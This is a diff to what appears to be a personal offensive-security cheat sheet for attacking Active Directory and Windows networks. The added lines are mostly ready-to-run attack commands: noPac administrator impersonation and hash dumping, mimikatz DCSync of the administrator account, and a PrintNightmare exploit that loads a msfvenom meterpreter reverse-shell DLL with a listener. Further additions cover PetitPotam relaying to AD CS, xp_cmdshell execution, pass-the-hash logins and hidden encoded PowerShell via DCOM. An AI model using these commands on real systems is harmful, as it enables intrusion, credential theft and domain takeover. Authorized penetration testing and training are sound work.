@@ -67,6 +67,16 @@ https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.managem
 - vnstat command
 https://humdi.net/vnstat/
 
+- Attack
+[SAM Name impersonation](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
+[CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
+[CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
+[NoPac](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
+[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
+[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
+[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
+[NTLM relaying to AD CS and the PetitPotam attack](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+
 - EyeWitness
 EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
 https://github.com/RedSiege/EyeWitness
@@ -497,9 +507,28 @@ PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 PS> New-PSSession -ComputerName XXX.XXX.XXX.XXX -Credential $credential
 # Shell
+PS> $password = ConvertTo-SecureString "TestUser" -AsPlainText -Force
+PS> $cred = new-object System.Management.Automation.PSCredential ("HOGE\TestUser", $password)
+PS> Enter-PSSession -ComputerName TargetComputer -Credential $cred
+# Shell
 PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("TargetHost", "XXX.XXX.XXX.XXX"))
 PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
 PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e aaaaaaaaaa", "7")
+# Workaround Kerberos "Double Hop" Problem
+## Register PSSession Configuration
+### When the session cannot access the DC directly using PowerView
+### https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2
+PS> Enter-PSSession -ComputerName TargetComputer.HOGE.COM -Credential hoge\TestUser
+Remote Accessed PS> klist
+#### the result show you cannot access DC with the current credential status
+PS> Register-PSSessionConfiguration -Name TestUserSession -RunAsCredential hoge\TestUser
+#### restart the WinRM service
+PS> Enter-PSSession -ComputerName TargetComputer -Credential hoge\TestUser -ConfigurationName TestUserSession
+Remote Accessed PS> klist
+#### ok
+##### powerview
+##### #Remote Accessed PS> import-module .\PowerView.ps1
+##### #Remote Accessed PS> get-domainuser -spn | select samaccountname
 # Web Access
 PS> iwr -UseDefaultCredentials http://TestWeb
 # Memo
@@ -532,6 +561,9 @@ PS> Get-ADGroupMember -Identity "Backup Operators"
 PS> $SecPassword = ConvertTo-SecureString 'TestPassword' -AsPlainText -Force
 PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
 PS> Add-DomainGroupMember -Identity 'Test Group' -Members 'TargetUser' -Credential $Cred -Verbose
+# check object
+PS> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1163"
+PS> Get-ObjectAcl "DC=hoge,DC=com" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier,ObjectAceType | fl
 # Change Password
 PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
 PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
@@ -650,8 +682,10 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 PS> Import-Module .\PowerView.ps1
 PS> Get-DomainPolicy
 # User
+PS> Get-DomainUser -Identity TestUser | select samaccountname,objectsid,memberof,useraccountcontrol | fl
 PS> Get-DomainUser -Identity TestUser -Domain hoge.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+## Checking for Reversible Encryption Option 
+PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
 PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 PS> Get-DomainUser * -spn | select samaccountname
 PS> Get-DomainUser -Identity TestUser | Get-DomainSPNTicket -Format Hashcat
@@ -663,6 +697,10 @@ PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName
 PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName |? {$_.MemberName -eq 'TestUser'} -Verbose
 PS> Get-DomainGroup -Identity "TestGroup" | select memberof
+##　lateral, remote, rdp
+PS> Get-NetLocalGroupMember -ComputerName TestComputer -GroupName "Remote Desktop Users"
+##　lateral, remote, WinRM
+PS> Get-NetLocalGroupMember -ComputerName TestComputer -GroupName "Remote Management Users"
 ## clear
 PS> Remove-DomainGroupMember -Identity "Test Group" -Members 'TestUser' -Credential $Cred -Verbose
 # ACL
@@ -686,6 +724,18 @@ PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser'
 PS> Set-DomainObject -Credential $Cred -Identity TargetUser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ## clear
 PS> Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
+# Workaround Kerberos "Double Hop" Problem
+## PSCredential Object
+Remote Accessed PS> import-module .\PowerView.ps1
+Remote Accessed PS> get-domainuser -spn
+### error
+Remote Accessed PS> klist
+Remote Accessed PS> $SecPassword = ConvertTo-SecureString 'TestPassword' -AsPlainText -Force
+Remote Accessed PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
+Remote Accessed PS> get-domainuser -spn -credential $Cred | select samaccountname
+### ok
+Remote Accessed PS> get-domainuser -spn | select
+###  without specifying the -credential flag, error
 ```
 
 # SharpView
@@ -696,6 +746,16 @@ PS> .\SharpView.exe Get-DomainUser -Identity TestUser
 
 # targetedKerberoast
 https://github.com/ShutdownRepo/targetedKerberoast
+
+# PowerUpSQL
+tag: shell. MS-SQL
+https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+```powershell
+PS> Import-Module .\PowerUpSQL.ps1
+PS> Get-SQLInstanceDomain
+PS> Get-SQLQuery -Verbose -Instance "XXX.XXX.XXX.XXX,1433" -username "hoge\TestUser" -password "TetsPassword" -query 'Select @@version'
+```
+
 
 # Metasploit
 ```zsh
@@ -848,6 +908,7 @@ mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /rc4:TestRc4Hash /run:"c
 mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /ntlm:TestNtlmHash /run:powershell
 mimikatz# lsadump::lsa /inject /name:TestUser
 mimikatz# lsadump::dcsync /user:hoge\TestUser
+mimikatz# lsadump::dcsync /domain:HOGE.COM /user:HOGE\administrator
 mimikatz# misc::skelton
 ```
 
@@ -963,6 +1024,7 @@ $ GetUserSPNs.py HOGE.local/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -reques
 ## ntlmrelayx.py
 ```zsh
 $ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
+$ ntlmrelayx.py -debug -smb2support --target http://TestCa.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 ## smbserver.py
 ```zsh
@@ -989,9 +1051,20 @@ $ wmiexec.py hoge.local/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
 # pth
 $ wmiexec.py -hashes :TestNtHash Administrator@XXX.XXX.XXX.XXX
 ```
+## mssqlclient.py 
+tag: shell
+- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
+```zsh
+$ mssqlclient.py HOGE/TestUser@XXX.XXX.XXX.XXX -windows-auth
+SQL> help
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /priv
+```
 
 # Evil-WinRM
+https://github.com/Hackplayers/evil-winrm
 ```zsh
+$ evil-winrm -i XXX.XXX.XXX.XXX -u TestUser
 $ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
 ```
 
@@ -1002,6 +1075,13 @@ PS> BloodHound.exe
 # On GUI
 ## Upload Data ... zip file
 ## Check ... Analysis Tab
+```
+```zsh
+# cypher
+## check Enter-PSSession feasibility
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+## check SQL Server Admin access feasibility
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
 ```
 ## SharpHound
 ```powershell
@@ -1018,9 +1098,42 @@ $ sudo neo4j start
 ```
 
 # noPac
+https://github.com/Ridter/noPac
 ```zsh
-$ git clone https://github.com/Ridter/noPac
+$ sudo python3 scanner.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -use-ldap
+$ sudo python3 noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TestAdHost -shell --impersonate administrator -use-ldap
+$ sudo python3 noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TestAdHost --impersonate administrator -use-ldap -dump -just-dc-user hoge/administrator
 ```
+
+# cube0x0's CVE-2021-1675
+https://github.com/cube0x0/CVE-2021-1675.git  
+caution: need to use cube0x0's version of Impacke
+```zsh
+# $ rpcdump.py @XXX.XXX.XXX.XXX | egrep 'MS-RPRN|MS-PAR'
+# $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=XXX.XXX.XXX.XXX LPORT=8080 -f dll > testpayload.dll
+# $ sudo smbserver.py -smb2support TestShare /path/to/testpayload.dll
+# [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST XXX.XXX.XXX.XXX
+# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+# [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+$ sudo python3 CVE-2021-1675.py hoge.com/TestUser:TestPassword@XXX.XXX.XXX.XXX '\\XXX.XXX.XXX.XXX\TestShare\testpayload.dll'
+# (Meterpreter 1)(C:\Windows\system32) > shell
+```
+
+# PKINITtools
+https://github.com/dirkjanm/PKINITtools
+
+# PetitPotam
+https://github.com/topotam/PetitPotam
+```zsh
+# $ sudo ntlmrelayx.py -debug -smb2support --target http://TestCa.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
+$ python3 PetitPotam.py XXX.XXX.XXX.XXX YYY.YYY.YYY.YYY
+```
+
+# certi
+https://github.com/zer1t0/certi
+locate CA
 
 # SharpGPOAbuse
 
@@ -1031,6 +1144,9 @@ https://github.com/funoverip/mcafee-sitelist-pwd-decryption
 ```zsh
 $ mcafee_sitelist_pwd_decrypt.py TestMcafeeCryptedPassword
 ```
+
+# GMSAPasswordReader
+https://github.com/rvazarkar/GMSAPasswordReader
 
 # Memo
 ```
